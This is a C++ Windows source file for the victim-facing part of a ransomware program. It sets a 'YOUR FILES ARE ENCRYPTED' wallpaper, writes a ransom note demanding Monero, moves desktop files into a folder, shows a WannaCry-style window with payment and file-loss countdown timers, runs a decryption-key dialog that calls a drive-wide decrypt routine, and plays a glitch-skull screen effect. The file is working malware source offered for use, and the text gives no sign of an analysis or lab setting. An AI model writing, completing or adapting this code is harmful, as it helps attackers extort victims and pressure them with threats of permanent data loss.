#include "common.hpp"
#include <shlobj.h>         // SHGetSpecialFolderPathW
#include <openssl/rand.h>   // RAND_bytes
#include <fstream>
#include <vector>
#include <ctime>
#include <cmath>   // for fmod
#include <filesystem>
#include <algorithm>   // std::remove_if
#include <cwctype>     // iswspace

static HBRUSH hRedBrush = NULL;
static HBRUSH hBlackBrush = NULL;
static time_t time_payment_raised = 0;
static time_t time_files_lost = 0;

#include <windows.h>
#include <iostream>
#include <vector>
#include <ctime>
#include <mmsystem.h> 
#pragma comment(lib, "winmm.lib") 


const char* skullFrame0 = R"(
        ______
     .-"      "-.
    /            \
   |              |
   |,  .-.  .-.  ,|
   | )(__/  \__)( |
   |/     /\     \|
   (_     ^^     _)
    \__|IIIIII|__/
     | \IIIIII/ |
     \          /
      `--------`
)";

const char* skullFrame1 = R"(
        ______
     .-"      "-.
    /            \
   |              |
   |,  .-.  .-.  ,|
   | )(__/  \__)( |
   |/     /\     \|
   (_     ^^     _)
    \__|IIIIII|__/

      | IIIIII |
      | \    / |
       `------`
)";

const char* frames[] = { skullFrame0, skullFrame1 };

LRESULT CALLBACK SkullWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            RECT rect;
            GetClientRect(hwnd, &rect);
            HBRUSH brush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(hdc, &rect, brush);
            DeleteObject(brush);

            SetBkMode(hdc, TRANSPARENT);
            
            COLORREF colors[] = { RGB(255,0,0), RGB(0,255,0), RGB(255,0,255), RGB(255,255,0) };
            SetTextColor(hdc, colors[rand() % 4]); 
            
            HFONT hFont = CreateFontA(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                                      DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, 
                                      CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, 
                                      FIXED_PITCH, "Consolas");
            SelectObject(hdc, hFont);

            int currentFrame = (GetTickCount64() / 150) % 2;

            DrawTextA(hdc, frames[currentFrame], -1, &rect, DT_CENTER | DT_VCENTER);
            
            DeleteObject(hFont);
            EndPaint(hwnd, &ps);
            return 0;
        }
        case WM_ERASEBKGND: return 1;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}


void ShowSkull() {
    const char* CLASS_NAME = "SkullWindowClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc   = SkullWindowProc;
    wc.hInstance     = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor       = LoadCursor(NULL, IDC_CROSS);
    RegisterClass(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    const int NUM_WINDOWS = 100;
    std::vector<HWND> skullWindows;
    
    for (int i = 0; i < NUM_WINDOWS; i++) {
        HWND hwnd = CreateWindowExA(
            WS_EX_TOPMOST, CLASS_NAME, "", 
            WS_POPUP | WS_BORDER, 
            0, 0, 250, 240, NULL, NULL, GetModuleHandle(NULL), NULL
        );
        skullWindows.push_back(hwnd);
    }

    PlaySoundA(MAKEINTRESOURCE(101), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC | SND_LOOP);
	
    srand((unsigned int)time(NULL));
    ULONGLONG start_time = GetTickCount64();

    while (GetTickCount64() - start_time < 5500) { 
        
        HDC desktopDC = GetDC(NULL); 
        int glitchX = rand() % screenW;
        int glitchY = rand() % screenH;
        int glitchW = rand() % 800;
        int glitchH = rand() % 300;

        int glitchType = rand() % 6; 

        if (glitchType == 0) {
            BitBlt(desktopDC, glitchX, glitchY, glitchW, glitchH, desktopDC, glitchX, glitchY, NOTSRCCOPY);
        } 
        else if (glitchType == 1) {
            HBRUSH randomBrush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
            HGDIOBJ oldBrush = SelectObject(desktopDC, randomBrush);
            PatBlt(desktopDC, glitchX, glitchY, glitchW, glitchH, PATINVERT);
            SelectObject(desktopDC, oldBrush);
            DeleteObject(randomBrush);
        } 
        else if (glitchType == 2  || glitchType == 4 || glitchType == 5) {
            int shiftX = (rand() % 150) - 75; 
            BitBlt(desktopDC, glitchX + shiftX, glitchY, glitchW, glitchH, desktopDC, glitchX, glitchY, SRCCOPY);
        }
        else if (glitchType == 3) {
            HDC memDC = CreateCompatibleDC(desktopDC);
            HBITMAP hBitmap = CreateCompatibleBitmap(desktopDC, glitchW, glitchH);
            HGDIOBJ oldBmp = SelectObject(memDC, hBitmap);
            BitBlt(memDC, 0, 0, glitchW, glitchH, desktopDC, glitchX, glitchY, SRCCOPY);

            for (int i = 0; i < 20; i++) {
                int shakeX = (rand() % 80) - 40; 
                int shakeY = (rand() % 80) - 40; 

                BitBlt(desktopDC, glitchX + shakeX, glitchY + shakeY, glitchW, glitchH, memDC, 0, 0, SRCCOPY);
                
                HBRUSH shakeBrush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
                HGDIOBJ oldShakeBrush = SelectObject(desktopDC, shakeBrush);
                PatBlt(desktopDC, glitchX + shakeX, glitchY + shakeY, glitchW, glitchH, PATINVERT);
                
                SelectObject(desktopDC, oldShakeBrush);
                DeleteObject(shakeBrush);

                MSG msg;
                while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                Sleep(15); 
            }

            SelectObject(memDC, oldBmp);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
        }

        ReleaseDC(NULL, desktopDC); 

        HWND randomHwnd = skullWindows[rand() % NUM_WINDOWS];
        
        if (rand() % 2 == 0) {
            int winX = rand() % (screenW - 250);
            int winY = rand() % (screenH - 240);
            SetWindowPos(randomHwnd, HWND_TOPMOST, winX, winY, 0, 0, SWP_NOSIZE | SWP_SHOWWINDOW);
            RedrawWindow(randomHwnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW); 
        } else {
            ShowWindow(randomHwnd, SW_HIDE);
        }

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(5); 
    }


    PlaySoundA(MAKEINTRESOURCE(102), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC | SND_LOOP);
	
    ULONGLONG finale_start = GetTickCount64();
    
    while (GetTickCount64() - finale_start < 3500) {
        
        for (HWND hwnd : skullWindows) {
            if (IsWindowVisible(hwnd)) {
                RedrawWindow(hwnd, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW);
            }
        }

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
        Sleep(30); 
    }

    PlaySoundA(NULL, 0, 0); 

    for (HWND hwnd : skullWindows) {
        DestroyWindow(hwnd);
    }
    UnregisterClassA(CLASS_NAME, GetModuleHandle(NULL));

    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_ERASE | RDW_UPDATENOW);
}

void GenerateWallpaperAndNote(const std::wstring& wallpaperPath, const std::wstring& notePath) {
    const int width = 1920, height = 1080;
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);

    HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
    RECT rect = {0, 0, width, height};
    FillRect(hdcMem, &rect, hBrush);
    DeleteObject(hBrush);

    SetTextColor(hdcMem, RGB(255, 0, 0));
    SetBkMode(hdcMem, TRANSPARENT);
    HFONT hFont = CreateFontW(100, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                              CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
    SelectObject(hdcMem, hFont);
    DrawTextW(hdcMem, L"YOUR FILES ARE ENCRYPTED", -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    BITMAPFILEHEADER bmfHeader = {0};
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    std::vector<BYTE> bmpData(dwBmpSize);
    GetDIBits(hdcMem, hBitmap, 0, bmp.bmHeight, bmpData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    std::ofstream file(wallpaperPath.c_str(), std::ios::binary);
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + dwBmpSize;
    file.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
    file.write((char*)&bi, sizeof(BITMAPINFOHEADER));
    file.write((char*)bmpData.data(), dwBmpSize);
    file.close();

    DeleteObject(hBitmap);
    DeleteObject(hFont);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    std::wofstream note(notePath.c_str());
    note << L"All your important files have been encrypted...\nTo decrypt them, you need to pay. Contact me: not.a.scammer@example.com\n As you can try to decrypt them in some way \n Good luck,I will save you time. Your files has been encrypted with AES-256-GCM with CSPRNG (from windows entropy)\n How did I encrypted masterkey? \n \n I encrypted it with RSA-8192 with OAEP padding. Yes,I ensured there is any of oracle shit there. :) \n So I will give you a hint,try look for masterKey in RAM - really, I am not joking.\n \n \n Okay, I was joking. There is no masterkey in RAM,if there is it was highly obfuscated or incorrect - I just copy-pasted some shit and after I checked it really was impossible to get correct key. \n If you have quantum computer maybe you can crack my public key. \n Have a nice day! \n I encourage to just pay,ofc on monero (XMR) account.";
    note.close();
}


void MoveDesktopItems(const wchar_t* folderName) {
    wchar_t desktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetSpecialFolderPathW(NULL, desktopPath, CSIDL_DESKTOP, FALSE))) {
        wchar_t newFolderPath[MAX_PATH];
        swprintf_s(newFolderPath, L"%s\\%s", desktopPath, folderName);
        CreateDirectoryW(newFolderPath, NULL);

        wchar_t searchPath[MAX_PATH];
        swprintf_s(searchPath, L"%s\\*.*", desktopPath);
        WIN32_FIND_DATAW findData;
        HANDLE hFind = FindFirstFileW(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0 ||
                    wcscmp(findData.cFileName, folderName) == 0) continue;
                if (wcscmp(findData.cFileName, L"READ_ME.txt") == 0 ||
                    wcscmp(findData.cFileName, L"ransom_wallpaper.bmp") == 0) continue;
                wchar_t srcPath[MAX_PATH];
                swprintf_s(srcPath, L"%s\\%s", desktopPath, findData.cFileName);
                wchar_t destPath[MAX_PATH];
                swprintf_s(destPath, L"%s\\%s", newFolderPath, findData.cFileName);
                MoveFileW(srcPath, destPath);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
}


struct KeyDialogData {
    const std::wstring* hashPath;
    SecureBuffer* masterKey;
    bool success;
};


static std::wstring StripWhitespace(const std::wstring& str) {
    std::wstring result = str;
    result.erase(std::remove_if(result.begin(), result.end(), ::iswspace), result.end());
    return result;
}


LRESULT CALLBACK KeyDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static KeyDialogData* pData = nullptr;
    static HWND hEdit = nullptr;

    switch (msg) {
        case WM_CREATE: {
            CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
            pData = (KeyDialogData*)pCreate->lpCreateParams;
            SetWindowLongPtrW(hwnd, GWLP_USERDATA, (LONG_PTR)pData);

            
            CreateWindowW(L"STATIC", L"Enter decryption key (hex, 64 characters):",
                          WS_CHILD | WS_VISIBLE | SS_LEFT,
                          10, 10, 600, 20, hwnd, nullptr, GetModuleHandleW(nullptr), nullptr);

            
            hEdit = CreateWindowW(L"EDIT", L"",
                                  WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                                  10, 35, 450, 22, hwnd, nullptr, GetModuleHandleW(nullptr), nullptr);
            SetFocus(hEdit);

            
            CreateWindowW(L"BUTTON", L"OK",
                          WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                          70, 70, 70, 25, hwnd, (HMENU)IDOK,
                          GetModuleHandleW(nullptr), nullptr);

            
            CreateWindowW(L"BUTTON", L"Cancel",
                          WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                          160, 70, 70, 25, hwnd, (HMENU)IDCANCEL,
                          GetModuleHandleW(nullptr), nullptr);

            return 0;
        }

        case WM_COMMAND: {
            if (LOWORD(wParam) == IDOK) {
                if (!pData || !hEdit) break;

                int len = GetWindowTextLengthW(hEdit);
                if (len < 64) {
                    MessageBoxW(hwnd, L"Key is too short.", L"Error", MB_OK | MB_ICONERROR);
                    break;
                }

                std::wstring keyHexRaw(len + 1, L'\0');
                GetWindowTextW(hEdit, &keyHexRaw[0], len + 1);
                keyHexRaw.resize(len);

                std::wstring keyHex = StripWhitespace(keyHexRaw);
                if (keyHex.length() != 64) {
                    MessageBoxW(hwnd, L"Key has to be 64 hex characters after stripping whitespaces.", L"Error", MB_OK | MB_ICONERROR);
                    break;
                }

                SecureBuffer tempKey(AES_256_KEY_SIZE);
                try {
                    tempKey = MasterKeyFromHexWString(keyHex);
                } catch (...) {
                    MessageBoxW(hwnd, L"Invalid hex characters in the string.", L"Error", MB_OK | MB_ICONERROR);
                    break;
                }

                
                if (!CheckKeyValidityFromBuffer(tempKey, *pData->hashPath)) {
                    MessageBoxW(hwnd, L"Entered key is invalid.", L"Error", MB_OK | MB_ICONERROR);
                    break;
                }

                *pData->masterKey = std::move(tempKey);
                pData->success = true;
                DestroyWindow(hwnd);
                break;
            }
            if (LOWORD(wParam) == IDCANCEL) {
                if (pData) pData->success = false;
                DestroyWindow(hwnd);
                break;
            }
            break;
        }

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}


bool AskForMasterKey(HINSTANCE hInstance, HWND hParent,
                     const std::wstring& hashPath,
                     SecureBuffer& outMasterKey) {
    const wchar_t CLASS_NAME[] = L"KeyDialogClass";
    WNDCLASSW wc = {};
    if (!GetClassInfoW(hInstance, CLASS_NAME, &wc)) {
        wc.lpfnWndProc   = KeyDialogProc;
        wc.hInstance     = hInstance;
        wc.lpszClassName = CLASS_NAME;
        wc.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_WINDOW + 1);
        wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
        RegisterClassW(&wc);
    }

    KeyDialogData data;
    data.hashPath   = &hashPath;
    data.masterKey  = &outMasterKey;
    data.success    = false;

    HWND hwnd = CreateWindowW(CLASS_NAME, L"Enter decryption key",
                              WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                              CW_USEDEFAULT, CW_USEDEFAULT, 600, 150,
                              hParent, nullptr, hInstance, &data);
    if (!hwnd) return false;

    if (hParent) EnableWindow(hParent, FALSE);
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);

    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hParent) {
        EnableWindow(hParent, TRUE);
        SetForegroundWindow(hParent);
    }
    return data.success;
}


LRESULT CALLBACK WannaCryWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    AppData* pData = (AppData*)GetWindowLongPtr(hwnd, GWLP_USERDATA);

    switch (msg) {
        case WM_CREATE: {
            CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
            pData = (AppData*)pCreate->lpCreateParams;
            SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)pData);

            hRedBrush = CreateSolidBrush(RGB(139, 0, 0));
            hBlackBrush = CreateSolidBrush(RGB(0, 0, 0));

            time_t now = time(NULL);
            time_payment_raised = now + (3 * 24 * 60 * 60);
            time_files_lost = now + (7 * 24 * 60 * 60);

            HFONT hFontTitle = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                           DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                           CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
            HFONT hFontNormal = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                            CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");

            HWND hStaticTitle = CreateWindowW(L"STATIC", L"Ooops, your files have been encrypted!",
                                              WS_VISIBLE | WS_CHILD | SS_CENTER,
                                              20, 20, 540, 30, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticTitle, WM_SETFONT, (WPARAM)hFontTitle, TRUE);

            CreateWindowW(L"STATIC", L"Payment will be raised on:", WS_VISIBLE | WS_CHILD,
                          30, 80, 200, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"STATIC", L"", WS_VISIBLE | WS_CHILD,
                          30, 100, 250, 20, hwnd, (HMENU)IDC_TIMER_DEADLINE1, NULL, NULL);
            CreateWindowW(L"STATIC", L"Your files will be lost on:", WS_VISIBLE | WS_CHILD,
                          350, 80, 200, 20, hwnd, NULL, NULL, NULL);
            CreateWindowW(L"STATIC", L"", WS_VISIBLE | WS_CHILD,
                          350, 100, 250, 20, hwnd, (HMENU)IDC_TIMER_DEADLINE2, NULL, NULL);

            HWND hStaticInfo = CreateWindowW(L"STATIC",
                L"What Happened to My Computer?\nYour important files are encrypted.\n\n"
                L"Can I Recover My Files?\nSure. We guarantee that you can recover all your files safely and easily.",
                WS_VISIBLE | WS_CHILD, 30, 150, 280, 200, hwnd, NULL, NULL, NULL);
            SendMessage(hStaticInfo, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

            CreateWindowW(L"BUTTON", L"Check Payment", WS_VISIBLE | WS_CHILD,
                          350, 180, 180, 40, hwnd, (HMENU)IDC_BTN_PAYMENT, NULL, NULL);
            CreateWindowW(L"BUTTON", L"Decrypt", WS_VISIBLE | WS_CHILD,
                          350, 230, 180, 40, hwnd, (HMENU)IDC_BTN_DECRYPT, NULL, NULL);
            CreateWindowW(L"BUTTON", L"Contact Us", WS_VISIBLE | WS_CHILD,
                          350, 280, 180, 40, hwnd, (HMENU)IDC_BTN_CONTACT, NULL, NULL);

            SetTimer(hwnd, IDT_REFRESH_TIMER, 1000, NULL);
            SendMessage(hwnd, WM_TIMER, IDT_REFRESH_TIMER, 0);
            break;
        }

        case WM_TIMER: {
            if (wParam == IDT_REFRESH_TIMER) {
                wchar_t buffer[100];
                time_t now = time(NULL);
                double diff_payment = difftime(time_payment_raised, now);
                if (diff_payment > 0) {
                    swprintf_s(buffer, L"Time Left: %02d:%02d:%02d:%02d",
                               (int)(diff_payment / 86400),
                               (int)(fmod(diff_payment, 86400) / 3600),
                               (int)(fmod(diff_payment, 3600) / 60),
                               (int)fmod(diff_payment, 60));
                } else {
                    wcscpy_s(buffer, L"Time has expired!");
                }
                SetDlgItemTextW(hwnd, IDC_TIMER_DEADLINE1, buffer);

                double diff_lost = difftime(time_files_lost, now);
                if (diff_lost > 0) {
                    swprintf_s(buffer, L"Time Left: %02d:%02d:%02d:%02d",
                               (int)(diff_lost / 86400),
                               (int)(fmod(diff_lost, 86400) / 3600),
                               (int)(fmod(diff_lost, 3600) / 60),
                               (int)fmod(diff_lost, 60));
                } else {
                    wcscpy_s(buffer, L"Files may be lost forever!");
                }
                SetDlgItemTextW(hwnd, IDC_TIMER_DEADLINE2, buffer);
            }
            break;
        }

        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, RGB(255, 255, 255));
            SetBkMode(hdcStatic, TRANSPARENT);
            return (INT_PTR)hRedBrush;
        }

        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case IDC_BTN_PAYMENT:
                    MessageBoxW(hwnd, L"Payment is accepted in Monero (XMR) only.", L"Payment Info", MB_OK);
                    break;

                case IDC_BTN_DECRYPT: {
                    if (pData && pData->masterKey) {
                        
                        std::wstring hashPath = GetMasterKeyHashPath();

                        SecureBuffer tempKey(AES_256_KEY_SIZE);
                        if (AskForMasterKey(GetModuleHandle(NULL), hwnd, hashPath, tempKey)) {
                            MessageBoxW(hwnd, L"Key correct! Decryption will start. This may take a while.",
                                        L"Success", MB_OK | MB_ICONINFORMATION);
                            std::atomic<size_t> count(0), skipped(0);
                            DecryptAllDrives(tempKey, true, count, skipped);
                            MessageBoxW(hwnd, L"Decryption finished! You can now close this window.",
                                        L"Done", MB_OK | MB_ICONINFORMATION);
                            DestroyWindow(hwnd);
                        } else {
                            MessageBoxW(hwnd, L"Decryption cancelled or invalid key.", L"Info", MB_OK);
                        }
                    }
                    break;
                }

                case IDC_BTN_CONTACT:
                    MessageBoxW(hwnd, L"Contact: not.a.scammer@example.com", L"Contact Us", MB_OK);
                    break;
            }
            break;
        }

        case WM_DESTROY: {
            KillTimer(hwnd, IDT_REFRESH_TIMER);
            if (hRedBrush) DeleteObject(hRedBrush);
            if (hBlackBrush) DeleteObject(hBlackBrush);
            PostQuitMessage(0);
            break;
        }

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}